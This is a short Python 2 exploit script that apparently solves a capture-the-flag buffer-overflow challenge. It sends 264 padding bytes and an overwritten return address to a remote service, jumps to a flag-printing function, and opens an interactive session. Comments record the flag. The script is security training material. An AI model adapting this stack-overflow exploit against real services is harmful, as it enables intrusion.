#!/usr/bin/python
import sys
import socket
import telnetlib 
import time
from struct import pack

def recvuntil(sock, txt):
  d = ""
  while d.find(txt) == -1:
    try:
      dnow = sock.recv(1)
      if len(dnow) == 0:
        print "-=(warning)=- recvuntil() failed at recv"
        print "Last received data:"
        print d
        return False
    except socket.error as msg:
      print "-=(warning)=- recvuntil() failed:", msg
      print "Last received data:"
      print d      
      return False
    d += dnow
  return d

def recvall(sock, n):
  d = ""
  while len(d) != n:
    try:
      dnow = sock.recv(n - len(d))
      if len(dnow) == 0:
        print "-=(warning)=- recvuntil() failed at recv"
        print "Last received data:"
        print d        
        return False
    except socket.error as msg:
      print "-=(warning)=- recvuntil() failed:", msg
      print "Last received data:"
      print d      
      return False
    d += dnow
  return d

# Proxy object for sockets.
class gsocket(object):
  def __init__(self, *p):
    self._sock = socket.socket(*p)

  def __getattr__(self, name):
    return getattr(self._sock, name)

  def recvall(self, n):
    return recvall(self._sock, n)

  def recvuntil(self, txt):
    return recvuntil(self._sock, txt)  

# Base for any of my ROPs.
def db(v):
  return pack("<B", v)

def dw(v):
  return pack("<H", v)

def dd(v):
  return pack("<I", v)

def dq(v):
  return pack("<Q", v)

def go():  
  global HOST
  global PORT
  s = gsocket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((HOST, PORT))

  # Put your code here!
  s.sendall("run\n")
  # payload = "A" * 266 // CTF{Why_does_cauliflower_threaten_us}
  # payload = "A" * 265 // qemu: uncaught target signal 4 (Illegal instruction) - core dumped
  # local_flag address 400840
  payload = "A" * 264
  payload += dd(0x00400840 + 12)
  s.sendall(payload + "\n")

  # Interactive sockets.
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()

  s.close()

HOST = 'buffer-overflow.ctfcompetition.com'
PORT = 1337
go()


